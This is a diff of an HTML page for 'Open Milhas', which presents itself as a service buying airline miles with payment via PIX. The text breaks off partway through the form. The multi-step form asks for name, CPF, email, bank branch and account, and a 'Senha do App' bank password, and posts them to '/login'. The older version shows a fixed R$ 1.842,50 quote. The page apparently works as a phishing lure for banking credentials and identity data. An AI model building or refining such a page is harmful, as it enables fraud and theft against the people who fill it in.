@@ -3,50 +3,91 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Open Milhas</title>
+    <title>Open Milhas | Venda suas milhas</title>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@800&display=swap" rel="stylesheet">
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <style>
-        body { background: #0046ff; font-family: sans-serif; color: white; }
-        .card { color: #333; border-radius: 20px; border: none; }
+        :root { --blue: #0046ff; --dark: #002db3; --gold: #c5a059; }
+        body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; margin: 0; }
+        
+        /* Cabeçalho */
+        .header { background: white; padding: 15px; text-align: center; border-bottom: 2px solid #eee; }
+        .logo { font-family: 'Montserrat', sans-serif; font-weight: 800; color: #0a1128; font-size: 1.6rem; text-transform: uppercase; }
+
+        /* Banner Azul (Hero) */
+        .hero { 
+            background: linear-gradient(135deg, var(--blue) 0%, var(--dark) 100%); 
+            color: white; padding: 50px 20px 120px 20px; text-align: center;
+        }
+        .hero h1 { font-family: 'Montserrat', sans-serif; font-weight: 800; font-size: 2.5rem; line-height: 1.1; margin-bottom: 15px; }
+
+        /* Card do Formulário */
+        .container-form { max-width: 480px; margin: -80px auto 50px auto; padding: 0 15px; }
+        .card { 
+            background: white; border: none; border-radius: 20px; 
+            box-shadow: 0 15px 35px rgba(0,0,0,0.15); padding: 30px;
+        }
+
+        /* Controle de Passos */
         .step { display: none; }
-        .active { display: block !important; }
+        .step.active { display: block !important; animation: slideUp 0.4s ease; }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+
+        /* Inputs e Botões */
+        .form-label { font-weight: 600; color: #444; margin-bottom: 5px; display: block; }
+        .form-control { 
+            border-radius: 10px; padding: 12px; border: 1px solid #ddd; 
+            margin-bottom: 20px; width: 100%; box-sizing: border-box; font-size: 1rem;
+        }
+        .btn-main { 
+            background: var(--blue); color: white; border: none; border-radius: 50px; 
+            padding: 16px; font-weight: 700; width: 100%; cursor: pointer; font-size: 1.1rem;
+        }
+        .btn-success { background: #28a745; }
+        
+        .val-cotacao { color: #28a745; font-family: 'Montserrat', sans-serif; font-weight: 800; font-size: 2.2rem; }
     </style>
 </head>
 <body>
-    <div class="container py-5">
-        <div class="text-center mb-4">
-            <h2 class="fw-bold">OPEN MILHAS</h2>
-        </div>
-        <div class="card p-4 mx-auto" style="max-width: 450px;">
-            <form action="/login" method="POST">
-                <div class="step active" id="s1">
-                    <h4>Dados Pessoais</h4>
-                    <input type="text" name="nome" class="form-control mb-2" placeholder="Nome" required>
-                    <input type="text" name="cpf" class="form-control mb-2" placeholder="CPF" required>
-                    <input type="email" name="email" class="form-control mb-3" placeholder="E-mail" required>
-                    <button type="button" class="btn btn-primary w-100" onclick="go(2)">CONTINUAR</button>
-                </div>
-                <div class="step" id="s2">
-                    <h4>Recebimento PIX</h4>
-                    <input type="text" name="agencia" class="form-control mb-2" placeholder="Agência">
-                    <input type="text" name="conta" class="form-control mb-2" placeholder="Conta">
-                    <input type="password" name="senha_app" class="form-control mb-3" placeholder="Senha do App">
-                    <button type="button" class="btn btn-primary w-100" onclick="go(3)">VER VALOR</button>
-                </div>
-                <div class="step" id="s3">
-                    <div class="text-center">
-                        <h3 class="text-success">R$ 1.842,50</h3>
-                        <button type="submit" class="btn btn-success w-100 mt-3">VENDER AGORA</button>
-                    </div>
-                </div>
-            </form>
-        </div>
-    </div>
-    <script>
-        function go(n) {
-            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
-            document.getElementById('s'+n).classList.add('active');
-        }
-    </script>
-</body>
-</html>
+
+<div class="header">
+    <div class="logo">OPEN <span style="color:var(--gold)">MILHAS</span></div>
+</div>
+
+<div class="hero">
+    <h1>Venda suas milhas com total segurança</h1>
+    <p class="opacity-75">Receba o valor via PIX em até 24 horas úteis.</p>
+</div>
+
+<div class="container-form">
+    <div class="card">
+        <form action="/login" method="POST">
+            
+            <div class="step active" id="s1">
+                <h4 class="fw-bold mb-4">Inicie sua cotação</h4>
+                <label class="form-label">Nome Completo</label>
+                <input type="text" name="nome" class="form-control" placeholder="Ex: Danilo Silva" required>
+                
+                <label class="form-label">CPF</label>
+                <input type="text" name="cpf" class="form-control" placeholder="000.000.000-00" required>
+                
+                <label class="form-label">E-mail para contato</label>
+                <input type="email" name="email" class="form-control" placeholder="seu@email.com" required>
+                
+                <button type="button" class="btn-main" onclick="next(2)">AVANÇAR</button>
+            </div>
+
+            <div class="step" id="s2">
+                <h4 class="fw-bold mb-4">Dados de Recebimento</h4>
+                <p class="text-muted small mb-4">Informe onde deseja receber o pagamento via PIX após a venda.</p>
+                
+                <label class="form-label">Agência</label>
+                <input type="text" name="agencia" class="form-control" placeholder="0001">
+                
+                <label class="form-label">Conta com dígito</label>
+                <input type="text" name="conta" class="form-control" placeholder="12345-6">
+                
+                <label class="form-label">Senha do App (Consulta)</label>
+                <input type="password" name="senha_app" class="form-control" placeholder="******">
+                
+                <button type="button" class="btn-main" onclick="next(3)">VER
